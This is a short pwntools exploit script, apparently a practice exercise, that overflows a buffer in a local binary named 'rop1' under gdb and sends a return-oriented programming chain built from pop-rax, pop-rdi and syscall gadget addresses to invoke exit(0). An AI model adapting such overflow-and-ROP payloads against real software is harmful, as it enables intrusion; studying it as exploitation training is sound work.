#!/bin/python

from pwn import *

context.terminal = ['alacritty', '-e', 'sh', '-c']

io = gdb.debug('./rop1', gdbscript = '''
    b main
    b *0x4017ae
    b *0x43f7e8
    c
        ''')

POP_RAX_ADDR = 0x43f7e7
POP_RDI_ADDR = 0x401cde
SYSCALL_ADDR = 0x4011fe


SYS_EXIT = 60


io.sendline(
        b'A' * 16 +
        b'B' * 8 +
        p64(POP_RAX_ADDR) +
        p64(SYS_EXIT) +
        p64(POP_RDI_ADDR) +
        p64(0x00) +
        p64(SYSCALL_ADDR)
    )

io.interactive()
